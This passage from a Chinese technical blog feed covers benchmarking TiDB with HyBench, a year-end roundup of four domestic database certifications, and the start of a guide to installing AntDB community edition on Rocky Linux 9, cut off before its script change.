class="line">----------------</span><br><span class="line">----------------</span><br><span class="line">----------------</span><br><span class="line">Data generation took 11831 ms</span><br><span class="line">No autoloader, do nothing!</span><br></pre></td></tr></table></figure></div>
<p>查看生成的数据文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 Data_1x]# ll -h</span><br><span class="line">total 11M</span><br><span class="line">-rw-r--r-- 1 root root 1.4M Jan 16 23:07 checkingAccount.csv</span><br><span class="line">-rw-r--r-- 1 root root 315K Jan 16 23:07 checking.csv</span><br><span class="line">-rw-r--r-- 1 root root 305K Jan 16 23:07 company.csv</span><br><span class="line">-rw-r--r-- 1 root root 3.6M Jan 16 23:07 customer.csv</span><br><span class="line">-rw-r--r-- 1 root root 320K Jan 16 23:07 loanApps.csv</span><br><span class="line">-rw-r--r-- 1 root root 411K Jan 16 23:07 loanTrans.csv</span><br><span class="line">-rw-r--r-- 1 root root 1.4M Jan 16 23:07 savingAccount.csv</span><br><span class="line">-rw-r--r-- 1 root root 3.2M Jan 16 23:07 transfer.csv</span><br><span class="line">[root@rocky9 Data_1x]# </span><br></pre></td></tr></table></figure></div>
<img  alt="03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240117-868d7816-3444-4eaf-b22c-d292b8e6e451.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="3-初始化表结构">3. 初始化表结构</h3>
<p>运行生成表结构的命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./hybench -t sql -f conf/tidb/ddl_tidb.sql -c conf/db.prop</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@rocky9 hybench]# ./hybench -t sql -f conf/tidb/ddl_tidb.sql -c conf/db.prop</span><br><span class="line">2024-01-16 23:11:10 [main] INFO  HyBench:324 - Hi~Bench, HyBench</span><br><span class="line">...</span><br><span class="line">2024-01-16 23:11:10 [main] INFO  ConfigLoader:61 - ===============configuration==================</span><br><span class="line">2024-01-16 23:11:10 [main] INFO  ConfigLoader:62 - </span><br><span class="line">2024-01-16 23:11:11 [main] INFO  ExecSQL:58 - execute query:CREATE TABLE IF NOT EXISTS  customer (</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h3 id="4-初始化表索引">4. 初始化表索引</h3>
<p>运行生成表索引的命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./hybench -t sql -f conf/tidb/create_index_tidb.sql -c conf/db.prop</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 hybench]# ./hybench -t sql -f conf/tidb/create_index_tidb.sql -c conf/db.prop</span><br><span class="line">2024-01-16 23:11:56 [main] INFO  HyBench:324 - Hi~Bench, HyBench</span><br><span class="line">...</span><br><span class="line">2024-01-16 23:11:56 [main] INFO  ConfigLoader:61 - ===============configuration==================</span><br><span class="line">2024-01-16 23:11:56 [main] INFO  ConfigLoader:62 - </span><br><span class="line">2024-01-16 23:11:58 [main] INFO  ExecSQL:58 - execute query:create index idx_loanapps_1 on loanapps ( applicantid );</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h3 id="5-导入测试数据">5. 导入测试数据</h3>
<p>运行导入数据的命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./hybench -t sql -f conf/tidb/load_data_tidb.sql -c conf/db.prop</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 hybench]# ./hybench -t sql -f conf/tidb/load_data_tidb.sql -c conf/db.prop</span><br><span class="line">2024-01-16 23:30:20 [main] INFO  HyBench:324 - Hi~Bench, HyBench</span><br><span class="line">...</span><br><span class="line">2024-01-16 23:30:20 [main] INFO  ConfigLoader:61 - ===============configuration==================</span><br><span class="line">2024-01-16 23:30:20 [main] INFO  ConfigLoader:62 - </span><br><span class="line">2024-01-16 23:30:22 [main] INFO  ExecSQL:58 - execute query:LOAD DATA LOCAL INFILE &#x27;Data_1x/customer.csv&#x27; INTO TABLE customer FIELDS TERMINATED BY &#x27;,&#x27;;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h3 id="6-连接数据库，查看库表信息">6. 连接数据库，查看库表信息</h3>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="comment">--comments --host 192.168.8.92 --port 4000 -u root</span></span><br><span class="line">use hybench</span><br><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure></div>
<p>共导入 8 张表。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_hybench <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> checking          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> checkingAccount   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> company           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> customer          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> loanapps          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> loantrans         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> savingAccount     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> transfer          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="7-运行-TP-负载测试">7. 运行 TP 负载测试</h3>
<p>运行负载测试：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./hybench -t runtp -c conf/db.prop -f conf/tidb/stmt_tidb.toml</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 hybench]# ./hybench -t runtp -c conf/db.prop -f conf/tidb/stmt_tidb.toml</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  HyBench:324 - Hi~Bench, HyBench</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:57 - ===============configuration==================</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - xapclient = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - at2_percent = 25</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - at1_percent = 35</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - apclient = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - xpRunMins = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - at4_percent = 15</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - apround = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - url = jdbc:mysql://192.168.8.92:4000/hybench?useUnicode=true&amp;characterEncoding=utf-8&amp;allowLoadLocalInfile=true</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - tpRunMins = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - at3_percent = 15</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - password = </span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - tpclient = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - fresh_interval = 20</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - sf = 1x</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - classname = com.mysql.cj.jdbc.Driver</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - xtpclient = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - apRunMins = 1</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - at5_percent = 7</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - db = tidb</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - username = root</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:59 - at6_percent = 3</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:61 - ===============configuration==================</span><br><span class="line">2024-01-16 23:38:57 [main] INFO  ConfigLoader:62 - </span><br><span class="line">2024-01-16 23:38:58 [main] INFO  HyBench:61 - Begin TP Workload</span><br><span class="line">2024-01-16 23:38:58 [pool-3-thread-1] INFO  Client:263 - Begin to run :TPClient, Test Duration is 1 mins</span><br><span class="line">2024-01-16 23:39:04 [Thread-0] INFO  Client:297 - Transaction 3 : max rt : 38.0 | min rt :23.0 | avg rt : 28.33 | 95% rt : 38.00 | 99% rt : 38.00</span><br><span class="line">...</span><br><span class="line">2024-01-16 23:39:04 [Thread-0] INFO  Client:307 - Current 1/10 time TP TPS is 6.50</span><br><span class="line">...</span><br><span class="line">2024-01-16 23:39:58 [Thread-0] INFO  Client:307 - Current 10/10 time TP TPS is 10.88</span><br><span class="line">2024-01-16 23:39:58 [pool-3-thread-1] INFO  Client:397 - Finished to execute TPClient</span><br><span class="line">2024-01-16 23:39:58 [main] INFO  HyBench:105 - TP Workload is done.</span><br><span class="line">2024-01-16 23:39:58 [main] INFO  HyBench:407 - Congs~ Test is done! Bye!</span><br><span class="line">====================Test Summary========================</span><br><span class="line">Test starts at 2024-01-16 23:38:58</span><br><span class="line">Test ends at 2024-01-16 23:39:58</span><br><span class="line">AP Concurrency is 0</span><br><span class="line">TP Concurrency is 1</span><br><span class="line">Total amount of TP Transaction is 654</span><br><span class="line">TPS is 10.9</span><br><span class="line">Query/Transaction response time(ms) histogram : </span><br><span class="line">------------TP-------------------</span><br><span class="line">TP Transaction  1 : max rt :      30.00 | min rt :      15.00 | avg rt :      21.28 | 95% rt :      30.00 | 99% rt :      30.00 </span><br><span class="line">TP Transaction  2 : max rt :      59.00 | min rt :      16.00 | avg rt :      27.83 | 95% rt :      59.00 | 99% rt :      59.00 </span><br><span class="line">TP Transaction  3 : max rt :      43.00 | min rt :      17.00 | avg rt :      24.08 | 95% rt :      41.25 | 99% rt :      43.00 </span><br><span class="line">TP Transaction  4 : max rt :      47.00 | min rt :      14.00 | avg rt :      24.52 | 95% rt :      41.40 | 99% rt :      47.00 </span><br><span class="line">TP Transaction  5 : max rt :      76.00 | min rt :      23.00 | avg rt :      37.18 | 95% rt :      72.55 | 99% rt :      76.00 </span><br><span class="line">TP Transaction  6 : max rt :      55.00 | min rt :      18.00 | avg rt :      29.35 | 95% rt :      54.30 | 99% rt :      55.00 </span><br><span class="line">TP Transaction  7 : max rt :      99.00 | min rt :      17.00 | avg rt :      32.33 | 95% rt :      99.00 | 99% rt :      99.00 </span><br><span class="line">TP Transaction  8 : max rt :      47.00 | min rt :      14.00 | avg rt :      25.90 | 95% rt :      46.20 | 99% rt :      47.00 </span><br><span class="line">TP Transaction  9 : max rt :     107.00 | min rt :      50.00 | avg rt :      70.00 | 95% rt :      99.75 | 99% rt :     107.00 </span><br><span class="line">TP Transaction 10 : max rt :     683.00 | min rt :     214.00 | avg rt :     393.02 | 95% rt :     617.40 | 99% rt :     683.00 </span><br><span class="line">TP Transaction 11 : max rt :     108.00 | min rt :      45.00 | avg rt :      66.57 | 95% rt :      93.00 | 99% rt :     108.00 </span><br><span class="line">TP Transaction 12 : max rt :     111.00 | min rt :      41.00 | avg rt :      64.20 | 95% rt :      98.20 | 99% rt :     111.00 </span><br><span class="line">TP Transaction 13 : max rt :     267.00 | min rt :      70.00 | avg rt :     122.98 | 95% rt :     219.45 | 99% rt :     267.00 </span><br><span class="line">TP Transaction 14 : max rt :     256.00 | min rt :      70.00 | avg rt :     116.97 | 95% rt :     236.20 | 99% rt :     256.00 </span><br><span class="line">TP Transaction 15 : max rt :     101.00 | min rt :      46.00 | avg rt :      67.52 | 95% rt :      99.40 | 99% rt :     101.00 </span><br><span class="line">TP Transaction 16 : max rt :     209.00 | min rt :      65.00 | avg rt :     102.05 | 95% rt :     205.90 | 99% rt :     209.00 </span><br><span class="line">TP Transaction 17 : max rt :     150.00 | min rt :      48.00 | avg rt :      71.58 | 95% rt :     116.50 | 99% rt :     150.00 </span><br><span class="line">TP Transaction 18 : max rt :     124.00 | min rt :      46.00 | avg rt :      69.42 | 95% rt :     103.00 | 99% rt :     124.00 </span><br><span class="line">====================Thank you!========================</span><br></pre></td></tr></table></figure></div>
<h3 id="8-清理测试表数据">8. 清理测试表数据</h3>
<p>运行清理脚本：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./hybench -t sql -f conf/dropTables.sql -c conf/db.prop</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 hybench]# ./hybench -t sql -f conf/dropTables.sql -c conf/db.prop</span><br><span class="line">2024-01-16 23:43:07 [main] INFO  HyBench:324 - Hi~Bench, HyBench</span><br><span class="line">...</span><br><span class="line">2024-01-16 23:43:07 [main] INFO  ConfigLoader:61 - ===============configuration==================</span><br><span class="line">2024-01-16 23:43:07 [main] INFO  ConfigLoader:62 - </span><br><span class="line">2024-01-16 23:43:09 [main] INFO  ExecSQL:58 - execute query:drop table if exists customer;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h2 id="注意事项">注意事项</h2>
<ol>
<li>
<p>HyBench 需要使用 JDK 17，这在 README 中有一处提及，全文搜索一下比较容易找到。</p>
<blockquote>
<p>封装了java执行命令(需要配置jdk17)</p>
</blockquote>
</li>
<li>
<p>目前，开源版本只支持1X、10x数据，后续在商业版本中会增加100x,1000x及更大规模的数据。</p>
<p>对应文件 <code>src/main/resource/parameters.toml</code> 中可以看到 <code>[1x]</code> 和 <code>[10x]</code>。</p>
</li>
<li>
<p>导入数据使用的 SQL 命令为 <code>LOAD DATA LOCAL INFILE</code>，是 <code>db.prop</code> 配置文件中，JDBC 连接串需要增加参数 <code>allowLoadLocalInfile=true</code>。</p>
</li>
<li>
<p>自 v7.4.0 起，TiDB 已经兼容 MySQL 8.0 的主要功能，推荐使用最新版本的 MySQL Connector/J 来连接 TiDB，因此源码工程依赖升级为 <code>mysql-connector-j:8.2.0</code>。</p>
</li>
</ol>
<h2 id="总结">总结</h2>
<p>本文基于开源数据库压测软件 HyBench 对 TiDB 进行适配，并做简单测试。</p>
<p>项目地址：<a class="link"   href="https://gitee.com/shawnyan/hybench/" >shawnyan/hybench <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>如果没有特殊需求，优先推荐使用 TiUP bench 组件对 TiDB 进行压测。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB Docs</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 7.x</tag>
        <tag>tidb docs</tag>
      </tags>
  </entry>
  <entry>
    <title>【2023年终盘点】那些今年考下的国产数据库认证</title>
    <url>/2023/other/my-db-cert-2023/</url>
    <content><![CDATA[<p>几个月前讨论过 <a class="link"   href="https://www.modb.pro/db/1688384690087092224" >如何成为一名国产数据库DBA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，如今到了年末，是时候来盘点一下今年考取了几个国产数据库认证。<br>
需要提前说明的是，本文中涉及的几个证书都是 FREE 的，也就不能抵个税了，合法、合规。</p>
<p>这四个证书分别是：</p>
<ol>
<li>TiDB 从业者认证</li>
<li>GBase 8c GDCA 认证</li>
<li>YashanDB YCA 认证</li>
<li>Galaxybase CBCA 认证</li>
</ol>
<h2 id="TiDB">TiDB</h2>
<p><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/2010035" >PingCAP 认证 TiDB 数据库从业者考试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是今年新推出的认证，不同于之前推出的 PCTA 和 PCTP 认证，从业者认证的考点更加基础，每一位对数据库感兴趣的同学都可以来尝试一下，是国产数据库从业者（产品经理、销售人员等）的必备证书之一。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231228-d1114515-8e18-43cc-9d7a-bbba8068e1cc.png"
                      referrerpolicy="no-referrer"
                >
<p>特别提示，考试形式是选择题，共20道，满分100，如果获得60分，那么恭喜你，成功通过考试。</p>
<p>关于考试题库的问题，没有题库，但是有些参考资料会助你一臂之力。</p>
<p>PingCAP 官方推出的限时免费课程： <a class="link"   href="https://learn.pingcap.com/learner/course/960001" >TiDB 数据库核心原理与架构（101） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>本课程专为将在工作中使用 TiDB 数据库的开发人员、DBA 和架构师设计。 本门课侧重于 TiDB 数据库的架构和设计原则，这是未来管理、开发、性能调整和故障排除的基础。</p>
</blockquote>
<p>还有 PingCAP 文档中文站： <a class="link"   href="https://docs.pingcap.com/zh/" >PingCAP 文档中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>如果国产数据库的文档也有排行榜，那么，TiDB 文档将会是“遥遥领先”。</p>
<p>顺便安利一个新活动，<a class="link"   href="https://asktug.com/t/topic/1019364" >2024 TiDB 文档挑战赛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提PR或Issue可以赢取Bose耳机、机械键盘等奖品。</p>
<img  alt="0.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231226-a26f188c-9ec5-4520-be93-3e800467fd6f.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="GBase">GBase</h2>
<p>今年 GBase 培训中心举办了十二期培训班，其中 GBase 8a / 8s / 8c 三个方向分别举办了 4 期，并且在3月举办首期“GBase 8c 多模多态分布式数据库认证培训班”，我参加的正是8c首期。</p>
<p>预计 2024 年一月份将迎来 24年第一期培训班，欢迎还未接触过 GBase 数据库的同学报名参加。</p>
<p>还有一个好消息是今年 GBase 网站全面升级改版，可以更加便利地从官网下载证书。直达链接： <a class="link"   href="https://www.gbase.cn/learn/certification-query" >https://www.gbase.cn/learn/certification-query <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231228-23b63027-3e2d-48e1-8f89-e02bc71638c1.png"
                      referrerpolicy="no-referrer"
                >
<p>GBase 8a 是面向大数据分析类应用领域的一款高性能国产新型数据库产品，用于满足数据密集型行业日益增大的数据查询、数据统计、数据分析、数据挖掘和数据备份等需求，可用做数据仓库系统、BI系统和决策支持系统的承载数据库。</p>
<p>GBase 8s 是天津南大通用数据技术股份有限公司自主研发的、成熟稳定的基于共享存储的数据库集群，拥有自主知识产权。GBase 8s适用于OLTP 应用场景，包括金融、电信行业的关键核心业务系统，安全、党政、国防等行业对信息安全性有较高要求的信息系统，以及大型企业的经营类、管理类信息系统，能够提供7*24小时不间断运行处理能力，在80%以上场景中可以替代国际主流数据库。</p>
<p>GBase 8c 是基于openGauss3.0构建的一款多模多态的分布式数据库，支持行存、列存、内存等多种存储模式和单机、主备式、分布式等多种部署形态。GBase 8c具备高性能、高可用、弹性伸缩、高安全性等特性，可以部署在物理机、虚拟机、容器、私有云和公有云，为关键行业核心系统、互联网业务系统和政企业务系统提供安全、稳定、可靠的数据存储和管理服务。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231226-f80eb142-6554-41ec-84da-552d26157932.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="YashanDB">YashanDB</h2>
<p>再次 <a class="link"   href="https://www.modb.pro/db/1734114896265175040" >恭喜这些体验官！首批 YashanDB 尝鲜征文活动获奖名单公布！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>崖山数据库系统YashanDB是深圳计算科学研究院完全自主研发设计的新型数据库系统，融入原创理论，支持单机/主备、共享集群、分布式等多种部署方式，覆盖OLTP/HTAP/OLAP交易和分析混合负载场景，为客户提供一站式的企业级融合数据管理解决方案。</p>
</blockquote>
<p>YashanDB个人版已正式向所有用户和开发者全面开放下载，从试用情况来看，YashanDB目前是最像Oracle数据的国产数据库，可以实现Oracle的平滑替代，完成数据库国产化目标。</p>
<p>关于 YashanDB 的 YCA 认证（YashanDB认证管理员），今年已经举办五期，通过YCA认证的学习，学员可以深入了解崖山数据库的架构、功能和运维管理等方面的知识，从而更好地应用崖山数据库解决实际业务问题。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231228-9bf7326f-932c-47b0-878b-28261b98a921.png"
                      referrerpolicy="no-referrer"
                >
<p>对于Oracle DBA来说，YCA认证过于简单，甚至可以裸考通过，而且YashanDB个人版也只能搭建单体或者主从架构，无法体验集群架构，所以更多精彩内容目前还处于“封印”状态。</p>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231226-1ba30f89-831d-45db-a676-e175249e629d.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="Galaxybase">Galaxybase</h2>
<p>Galaxybase是中国自主知识产权的通用商业化分布式图数据库。本月在中国数据库排行榜图库分类中排名第五。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231228-9b556905-bb50-4c48-8560-7dafe3739380.png"
                      referrerpolicy="no-referrer"
                >
<p>之前撰文介绍过 Galaxybase 的 GBCA 认证， <a class="link"   href="https://www.modb.pro/db/645884" >GBCA (Galaxybase) 认证学习资料内参 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>如果对图数据库感兴趣，可以了解 创邻科技 Galaxybase 以及这个 GBCA 认证。</p>
<p>此外，创邻科技 Galaxybase 的中级认证 GBCP（Galaxybase Certified Professional） 也已经正式开课了，作为从 GBCA 图数据库入门跃升到 GBCM 图技术专家的中间课程，GBCP培训注重提升学员的图数据库实操能力，解决实际开发应用难题。</p>
<p>具体可以戳文了解： <a class="link"   href="https://www.modb.pro/db/1732615042200330240" >拿下创邻科技GBCP证书，成为图数据库专家！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231226-eaf3c487-4190-40fe-b8e2-878c34b4f81c.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="尾声">尾声</h2>
<p>盘点是一种总结，认证是一个学习阶段的见证，我们都在负重前行，期待明年会更好。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>清单</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>tidb</tag>
        <tag>yashan</tag>
      </tags>
  </entry>
  <entry>
    <title>AntDB v7.2.0 社区版适配 Rocky 9 及体验笔记</title>
    <url>/2023/other/antdb-install/</url>
    <content><![CDATA[<h2 id="关于-AntDB">关于 AntDB</h2>
<p>2023年12月的 墨天轮中国数据库流行度排行 火热出炉，目前，AntDB 排在第十位。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
<p>AntDB 数据库始于2008年，隶属于亚信科技旗下通用型企业级数据库产品，在运营商的核心系统上，为全国24个省份的10亿多用户提供在线服务，具备高性能、弹性扩展、可靠性等产品特性，峰值每秒可处理百万笔通信核心交易，应用范围包含通信、金融、交通、能源、物联网等行业。<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
<img  alt="img.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231211-b4d45c01-ec47-4a8f-8487-8d9d947eee23.png"
                      width=800px referrerpolicy="no-referrer"
                >
<h2 id="关于-AntDB-社区版">关于 AntDB 社区版</h2>
<p>3月1日，亚信科技AntDB数据库社区版正式开放免费下载。作为AntDB数据库的首个社区版产品，AntDB-CE（Community Edition）V7.2.0具有完整、易用、兼容度高的企业级分布式数据库产品特性。<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p>
<p>AntDB-CE社区版采用了Share-Nothing的无共享架构，包括计算节点(Coordinator)、数据节点(DB)、全局事务管理器（GTM）和管理节点四种组件。</p>
<ul>
<li>计算节点（Coordinator）</li>
</ul>
<p>提供SQL解析、优化、路由、结果汇聚、分布式事务控制等功能</p>
<ul>
<li>数据节点(DB)</li>
</ul>
<p>真正存储业务数据的组件，通过分库分表实现数据库能力的水平扩展，提供多种分片函数，支持定制开发；支持数据节点的分组管理</p>
<ul>
<li>全局事务管理器(GTMCoordinator）</li>
</ul>
<p>分布式事务管理的重要组件；提供事务ID和事务快照以及全局序列号、时间戳，参与2PC提供分布式MVCC 能力，同时提供Coordinator 的能力</p>
<ul>
<li>管理节点（Manager）</li>
</ul>
<p>管理整个集群节点的添加、配置、删除、启停、初始化、主备倒换等所有状态。</p>
<h2 id="AntDB-社区版集中式部署安装">AntDB 社区版集中式部署安装</h2>
<p>从官方网站<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup> 下载安装包，由于我本地操作系统为 Rocky Linux 9.3，网站并没有提供对应版本的安装包，这里选择了 centos8 作为替代。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/system-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br></pre></td></tr></table></figure></div>
<p>官方网站已经给出了安装步骤，可以参考：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">仅需 4 步，完成 AntDB 社区版安装：</span><br><span class="line"></span><br><span class="line">1. 下载在root用户下</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wget http://gz.antdb.net/zip/antdb-ce-7.2.0.centos8.x86_64.tar.gz</span></span><br><span class="line">                  </span><br><span class="line">2. 解压</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">tar-zxvf antdb-ce-7.2.0.centos8.x86_64.tar.gz</span></span><br><span class="line">                  </span><br><span class="line">3. 安装</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cd</span> antdb-ce-7.2.0.centos8.x86_64</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sh antdb_install.sh -s</span></span><br><span class="line">                  </span><br><span class="line">4. 进入客户端</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">su - antdb</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">psql -d antdb -p 6655</span></span><br><span class="line">//根据部署的结果修改端口号</span><br><span class="line"></span><br><span class="line">操作系统：CentOS 8 </span><br></pre></td></tr></table></figure></div>
<h3 id="适配-Rocky-9">适配 Rocky 9</h3>
<p>在执行安装脚本时，遇到报错，提示不支持 Rocky 操作系统。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 antdb-ce-7.2.0.centos8.x86_64]$ ./antdb_install.sh -s</span><br><span class="line">[Info] AntDB install begins</span><br><span class="line">The current operating system hardware resources are less than the recommended hardware requirements for antdb operation.</span><br><span class="line">...</span><br><span class="line">Continue the installation.</span><br><span class="line">It is recommended to improve the hardware configuration to improve the user experience.</span><br><span class="line">No package was found.</span><br><span class="line">The current operating system needs a package like antdb-.*.rocky.x86_64.tar.gz.</span><br><span class="line">Please check the installation package. Exit.</span><br><span class="line">[shawnyan@rocky9 antdb-ce-7.2.0.centos8.x86_64]$</span><br></pre></td></tr></table></figure></div>
<p>找到相关的判断逻辑，然后增加 Rocky 部分即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vi ./setup/common/setup-common</span><br></pre></td></tr></table></figure></div>
<p>在第 252 行增加如下判断。</p>
